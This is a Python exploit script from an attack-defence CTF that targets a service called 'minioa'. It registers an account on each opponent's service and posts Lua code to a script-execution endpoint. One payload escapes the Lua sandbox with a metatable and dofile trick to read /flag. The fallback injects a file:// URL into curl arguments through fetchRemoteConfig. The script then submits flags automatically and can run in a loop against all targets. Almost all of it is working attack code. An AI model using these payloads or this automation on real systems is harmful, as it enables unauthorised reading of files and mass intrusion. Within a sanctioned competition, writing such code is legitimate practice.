#!/usr/bin/env python3
"""
AWD Web Exploit - minioa
========================
Lua script execution with curl file:// protocol injection.

Vulnerability: fetchRemoteConfig() accepts custom_args which are passed to curl,
allowing file:// protocol to read arbitrary files.

Usage:
    python3 web.py              # Run against all targets
    python3 web.py 172.24.84.11 # Run against specific IP
    python3 web.py --loop       # Run continuously
    python3 web.py --info       # Print competition info
"""

import sys
import re
import time
import random
import string
import requests

from awd_lib import (
    chal, submit, targets, our_ip, discord,
    setup_auth, ssh_command, print_info, print_targets,
)

# === CHALLENGE CONFIG ===
PORT = 8888           # minioa port
TIMEOUT = 10          # Request timeout
LOOP_DELAY = 60       # Seconds between rounds (for --loop)

# Configure challenge
chal("minioa.csv")


def random_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


def get_session(base_url):
    """Register and login, return authenticated session."""
    session = requests.Session()
    username = f"hacker_{random_str()}"
    password = "password123"
    
    # Register
    session.post(f"{base_url}/doRegister", data={
        "username": username,
        "password": password,
        "nickname": "hacker"
    }, timeout=TIMEOUT)
    
    # Login
    session.post(f"{base_url}/doLogin", data={
        "username": username,
        "password": password
    }, timeout=TIMEOUT)
    
    return session


# ========================
# EXPLOIT: Lua fetchRemoteConfig file:// injection
# ========================

def exploit(ip, port):
    """
    Exploit Lua sandbox escape via dofile + metatable trick.
    
    The /flag file contains "flag{...}" which when executed as Lua code
    with a custom metatable, treats "flag" as a function call.
    """
    try:
        base_url = f"http://{ip}:{port}"
        session = get_session(base_url)
        
        # Lua sandbox escape: dofile trick with metatable
        # Makes undefined globals return their name, defines "flag" as a function
        # that prints its table argument. When /flag is dofile'd, flag{...} becomes
        # a function call with table argument.
        lua_code = '''setmetatable(_G, {
    __index = function(t, k)
        return k
    end
})
rawset(_G, "flag", function(t)
    local p = {}
    for i = 1, #t do
        p[i] = tostring(t[i])
    end
    print("flag{" .. table.concat(p) .. "}")
end)
pcall(dofile, "/flag")
setmetatable(_G, nil)'''
        
        resp = session.post(f"{base_url}/script/execute", 
                           data={"code": lua_code}, timeout=TIMEOUT)
        result = resp.json()
        
        output = result.get('output', '')
        error = result.get('error', '')
        
        # Check for flag in output or error
        for text in [output, error]:
            if text:
                flag = extract_flag(text)
                if flag:
                    return flag
        
        # Fallback: try the curl file:// method
        lua_code2 = '''
local config = {}
config["url"] = "http://127.0.0.1:8080"
config["custom_args"] = {"file:///flag"}
local output = fetchRemoteConfig(config)
print(output)
'''
        resp = session.post(f"{base_url}/script/execute", 
                           data={"code": lua_code2}, timeout=TIMEOUT)
        result = resp.json()
        
        output = result.get('output', '')
        if output:
            flag = extract_flag(output)
            if flag:
                return flag
        
        return None
        
    except Exception as e:
        return None


def extract_flag(text):
    """
    Extract flag from response text.
    Modify the pattern to match your CTF's flag format.
    """
    # Common flag patterns - adjust as needed
    patterns = [
        r'hkcert\d{2}\{[^}]+\}',  # hkcert24{...}
        r'flag\{[^}]+\}',         # flag{...}
        r'FLAG\{[^}]+\}',         # FLAG{...}
        r'CTF\{[^}]+\}',          # CTF{...}
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group(0)
    return None


# ========================
# RUNNER CODE (don't edit)
# ========================

def run_single(ip):
    """Run exploit against a single target."""
    print(f"[*] Attacking {ip}:{PORT}...")
    flag = exploit(ip, PORT)
    
    if flag:
        print(f"[+] Got flag: {flag}")
        result = submit(flag, target=ip)
        if result["success"]:
            if result["duplicate"]:
                print(f"[=] Flag submitted (duplicate)")
            else:
                print(f"[+] NEW FLAG SUBMITTED!")
                # discord.pwned(ip, flag)  # Optional
        else:
            print(f"[-] Submit failed: {result['message']}")
        return True
    else:
        print(f"[-] No flag from {ip}")
        return False


def run_all():
    """Run exploit against all targets."""
    target_list = targets()  # Already excludes our IP
    
    print(f"[*] Our IP: {our_ip()}")
    print(f"[*] Targets: {len(target_list)}")
    print(f"[*] Port: {PORT}")
    print()
    
    # discord.info(f"Starting exploit round on {len(target_list)} targets")  # Optional
    
    success = 0
    failed = 0
    
    for ip in target_list:
        if run_single(ip):
            success += 1
        else:
            failed += 1
    
    print()
    print(f"[*] Done: {success} success, {failed} failed")
    # discord.info(f"Round complete: {success} success, {failed} failed")  # Optional
    return success, failed


def run_loop():
    """Run exploit continuously."""
    print(f"[*] Running in loop mode (Ctrl+C to stop)")
    print(f"[*] Delay between rounds: {LOOP_DELAY}s")
    
    round_num = 0
    while True:
        round_num += 1
        print(f"\n{'='*50}")
        print(f"ROUND {round_num}")
        print(f"{'='*50}")
        
        try:
            run_all()
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            break
        except Exception as e:
            print(f"[-] Round error: {e}")
            # discord.error(f"Round {round_num} error", exc=e)  # Optional
        
        print(f"[*] Sleeping {LOOP_DELAY}s...")
        try:
            time.sleep(LOOP_DELAY)
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            break


def main():
    # Auto-setup auth PEM file with correct permissions
    try:
        setup_auth()
    except Exception as e:
        print(f"[!] Auth setup skipped: {e}")
    
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if arg == "--loop" or arg == "-l":
            run_loop()
        elif arg == "--help" or arg == "-h":
            print(__doc__)
        elif arg == "--info" or arg == "-i":
            print_info()
        elif arg == "--targets" or arg == "-t":
            print_targets()
        elif arg == "--ssh":
            # Print SSH command for first target or specified IP
            ip = sys.argv[2] if len(sys.argv) > 2 else targets()[0]
            print(ssh_command(ip))
        else:
            # Attack specific IP
            run_single(arg)
    else:
        # Attack all targets once
        run_all()


if __name__ == "__main__":
    main()
